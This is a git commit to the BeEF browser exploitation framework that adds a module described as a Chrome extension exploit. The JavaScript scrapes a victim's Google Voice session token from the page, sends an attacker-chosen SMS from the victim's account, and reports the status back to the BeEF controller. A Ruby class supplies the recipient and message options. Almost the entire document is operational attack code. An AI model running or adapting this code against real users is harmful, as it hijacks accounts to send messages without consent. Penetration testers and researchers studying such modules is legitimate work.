447b0060963c4c7c1c981ee3f5c91ff1b7533459
antisnatchor <antisnatchor@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-09-25 13:05:38 +0000

    (Fixes issue 508): added Chrome extension exploit that send an SMS using the Google Voice account of the victim
    git-svn-id: https://beef.googlecode.com/svn/trunk@1308 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

---
+++ modules/chrome_extensions/send_gvoice_sms/command.js
@@ -0,0 +1,40 @@
+beef.execute(function() {
+		var to = "<%= @to %>";
+		var message = "<%= @message %>";
+		var status;
+		var regSMS = "('_rnr_se': ')([a-zA-Z0-9\+=]+)";//?(',)"
+		
+		function sendSMSNOW(message,number,token){
+				token = token.replace("+","%2b").replace("=","%3d");
+				var sendMessage = new XMLHttpRequest();
+				sendMessage.open("POST","https://www.google.com/voice/sms/send/",false);
+				sendMessage.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
+				params = "id=&phoneNumber="+number+"&conversationId=&text="+message+"&contact=&_rnr_se="+token
+				sendMessage.send(params)
+				eval("response="+sendMessage.responseText);
+				if(response['ok'] == true){
+						status = "OK. Your message has been sent.";
+				} else {
+						status = "ERROR. Something went wrong. Make sure you prefix the number with the country code.";
+				}
+		}
+		
+		function sendSMS(message,number) {
+				var client = new XMLHttpRequest();
+				client.open("GET", "https://www.google.com/voice" ,false);
+				client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
+				client.send();
+		
+				var re = new RegExp(regSMS);
+				var m = re.exec(client.responseText);
+				if (m != null) {
+				//return m[2];
+				sendSMSNOW(message,number,m[2]);
+			}
+		}	
+
+
+		sendSMS(message,to);
+
+		beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'to='+to+'&message='+message+'&status='+status);
+});
---
+++ modules/chrome_extensions/send_gvoice_sms/module.rb
@@ -0,0 +1,18 @@
+class Send_gvoice_sms < BeEF::Core::Command
+
+  def self.options
+    return [
+        {'name' => 'to', 'ui_label' => 'To: ', 'value' => '1234567890',  'type' =>'textarea', 'width' => '300px'},
+        {'name' => 'message', 'ui_label' => 'Message: ', 'value' => 'Hello from BeEF', 'type' => 'textarea', 'width' => '300px', 'height' => '200px'}
+    ]
+  end
+
+  def post_execute
+    content = {}
+    content['To'] = @datastore['to']
+    content['Message'] = @datastore['message']
+    content['Status'] = @datastore['status']
+    save content
+  end
+  
+end
